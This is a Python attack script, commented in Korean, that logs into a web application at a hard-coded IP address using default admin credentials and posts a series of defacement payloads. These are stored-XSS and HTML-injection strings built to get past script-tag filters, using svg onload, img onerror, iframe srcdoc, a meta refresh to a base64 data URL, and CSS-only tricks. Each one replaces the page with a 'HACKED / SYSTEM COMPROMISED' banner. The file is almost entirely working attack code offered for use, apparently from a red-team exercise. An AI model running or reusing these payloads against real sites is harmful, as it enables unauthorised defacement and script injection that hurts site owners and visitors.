#!/usr/bin/env python3
"""
권한 없이 Defacement 하는 다양한 방법
"""

import requests

TARGET = "http://52.78.221.104"
LOGIN_URL = f"{TARGET}/login.php"
NEW_POST_URL = f"{TARGET}/new_post.php"

USERNAME = "admin"
PASSWORD = "admin123"

# 방법 1: iframe + meta refresh (script 태그 없이)
DEFACE_IFRAME = """<meta http-equiv="refresh" content="0;url=data:text/html;base64,PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiPjx0aXRsZT5IQUNLRUQ8L3RpdGxlPjxzdHlsZT4qe21hcmdpbjowO3BhZGRpbmc6MH1ib2R5e2JhY2tncm91bmQ6IzAwMDtjb2xvcjojMGYwO2ZvbnQtZmFtaWx5Om1vbm9zcGFjZTtkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7aGVpZ2h0OjEwMHZoO3RleHQtYWxpZ246Y2VudGVyfS5za3VsbHtmb250LXNpemU6MTBweDtsaW5lLWhlaWdodDoxO3doaXRlLXNwYWNlOnByZX1oMXtmb250LXNpemU6M2VtO2NvbG9yOiNmMDA7YW5pbWF0aW9uOmIgLjVzIGluZmluaXRlfUBrZXlmcmFtZXMgYnswJSwxMDAle29wYWNpdHk6MX01MCV7b3BhY2l0eTouM319PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGRpdj48ZGl2IGNsYXNzPSJza3VsbCI+ICAgIF8uLS0iIi0uXwogLiIgICAgICAgICAiLgovICAgICAgICAgICAgIFwKfCwgIC4tLiAgLi0uICAsfAp8ICkoX18vICBcX18pKCB8CnwvICAgICAvXCAgICAgXHwKKF8gICAgIF5eICAgICBfKQogXF9fX19fX19fX19fXy88L2Rpdj48aDE+SEFDS0VEPC9oMT48cCBzdHlsZT0ibWFyZ2luOjIwcHggMCI+U1lTVEVNIENPTVBST01JU0VEPC9wPjxwPltTUUwgSW5qZWN0aW9uOiBCWVBBU1NFRF08YnI+W0ZpbGUgVXBsb2FkOiBFWFBMT0lURURdPGJyPltYU1M6IElOSkVDVEVEXTxicj5bQ1NGUjogRVhFQ1VURURdPGJyPltEYXRhYmFzZTogQ09NUFJPTUlTRURdPC9wPjxwIHN0eWxlPSJtYXJnaW4tdG9wOjIwcHgiPi0tIFJlZCBUZWFtIC0tPC9wPjwvZGl2PjwvYm9keT48L2h0bWw+">"""

# 방법 2: img onerror 이벤트 핸들러
DEFACE_IMG_ONERROR = """<img src=x onerror="document.body.innerHTML='<div style=\\'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;z-index:9999\\'><div style=\\'text-align:center\\'><pre style=\\'color:#0f0\\'>    _.--&quot;&quot;-._ \\n .&quot;         &quot;. \\n/             \\\\ \\n|,  .-.  .-.  ,| \\n| )(__/  \\\\__)( | \\n|/     /\\\\     \\\\| \\n(_     ^^     _) \\n \\\\____________/</pre><h1 style=\\'color:#f00;font-size:3em\\'>HACKED</h1><p>SYSTEM COMPROMISED</p><p>[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p>-- Red Team --</p></div></div>'">"""

# 방법 3: svg onload
DEFACE_SVG = """<svg onload="document.body.innerHTML='<div style=\\'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;z-index:9999\\'><div style=\\'text-align:center\\'><pre style=\\'color:#0f0;font-family:monospace\\'>    _.--&quot;&quot;-._ \\n .&quot;         &quot;. \\n/             \\\\ \\n|,  .-.  .-.  ,| \\n| )(__/  \\\\__)( | \\n|/     /\\\\     \\\\| \\n(_     ^^     _) \\n \\\\____________/</pre><h1 style=\\'color:#f00;font-size:3em;animation:blink 0.5s infinite\\'>HACKED</h1><p>SYSTEM COMPROMISED</p><p>[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p>-- Red Team --</p></div></div>'"></svg>"""

# 방법 4: iframe srcdoc (가장 깨끗한 방법)
DEFACE_IFRAME_SRCDOC = """<iframe srcdoc="<!DOCTYPE html><html><head><meta charset='utf-8'><title>HACKED</title><style>*{margin:0;padding:0}body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}.skull{font-size:10px;line-height:1;white-space:pre}h1{font-size:3em;color:#f00;animation:b .5s infinite}@keyframes b{0%,100%{opacity:1}50%{opacity:.3}}</style></head><body><div><div class='skull'>    _.--&quot;&quot;-._&#10; .&quot;         &quot;.&#10;/             \\&#10;|,  .-.  .-.  ,|&#10;| )(__/  \\__)( |&#10;|/     /\\     \\|&#10;(_     ^^     _)&#10; \\____________/</div><h1>HACKED</h1><p style='margin:20px 0'>SYSTEM COMPROMISED</p><p>[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p style='margin-top:20px'>-- Red Team --</p></div></body></html>" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:9999"></iframe>"""

# 방법 5: CSS만으로 (텍스트 변경 없이 화면만 가림)
DEFACE_CSS_ONLY = """<style>*{display:none!important}body{display:flex!important;justify-content:center!important;align-items:center!important;background:#000!important;color:#0f0!important;font-family:monospace!important;min-height:100vh!important}body:before{content:'    _.--""-._\\A ."         ".\\A/             \\\\\\A|,  .-.  .-.  ,|\\A| )(__/  \\\\__)( |\\A|/     /\\\\     \\\\|\\A(_     ^^     _)\\A \\\\____________/\\A\\AHACKED\\A\\ASYSTEM COMPROMISED\\A\\A[SQL Injection: BYPASSED]\\A[File Upload: EXPLOITED]\\A[XSS: INJECTED]\\A[CSRF: EXECUTED]\\A[Database: COMPROMISED]\\A\\A-- Red Team --';white-space:pre;display:block!important;text-align:center;font-size:1.5em}</style>"""

def login():
    """로그인"""
    session = requests.Session()
    data = {'username': USERNAME, 'password': PASSWORD}
    response = session.post(LOGIN_URL, data=data)

    if 'admin' in response.text or response.status_code == 302:
        print("[+] Login successful")
        return session
    else:
        print("[-] Login failed")
        return None

def post_content(session, content, method_name):
    """게시물 작성"""
    data = {'content': content}
    response = session.post(NEW_POST_URL, data=data)

    if response.status_code == 200:
        print(f"[+] Posted: {method_name}")
        return True
    else:
        print(f"[-] Failed: {method_name}")
        return False

def deploy_all_methods():
    """모든 방법 시도"""
    print("=" * 60)
    print("💀 Defacement Without Script Tag")
    print("=" * 60)
    print()

    session = login()
    if not session:
        return

    methods = [
        ("SVG onload", DEFACE_SVG),
        ("IMG onerror", DEFACE_IMG_ONERROR),
        ("iframe srcdoc", DEFACE_IFRAME_SRCDOC),
        ("CSS only", DEFACE_CSS_ONLY),
    ]

    print()
    print("[*] Trying multiple bypass methods...")
    print()

    for name, payload in methods:
        print(f"[*] Trying: {name}")
        post_content(session, payload, name)
        import time
        time.sleep(0.5)

    print()
    print("=" * 60)
    print("✅ All methods deployed!")
    print("=" * 60)
    print()
    print("Check the site:")
    print(f"  {TARGET}/")
    print()
    print("One of these methods should work:")
    print("  1. SVG onload - 가장 효과적")
    print("  2. IMG onerror - 대부분 작동")
    print("  3. iframe srcdoc - 깨끗한 전체 화면")
    print("  4. CSS only - 필터링이 심할 때")
    print()

def show_payloads():
    """페이로드만 출력"""
    print("=" * 60)
    print("🎯 XSS Payloads (without <script> tag)")
    print("=" * 60)
    print()

    print("Method 1: SVG onload")
    print("-" * 60)
    print(DEFACE_SVG)
    print()

    print("Method 2: IMG onerror")
    print("-" * 60)
    print(DEFACE_IMG_ONERROR)
    print()

    print("Method 3: iframe srcdoc (BEST)")
    print("-" * 60)
    print(DEFACE_IFRAME_SRCDOC)
    print()

    print("Method 4: CSS only")
    print("-" * 60)
    print(DEFACE_CSS_ONLY)
    print()

if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == "show":
        show_payloads()
    else:
        deploy_all_methods()
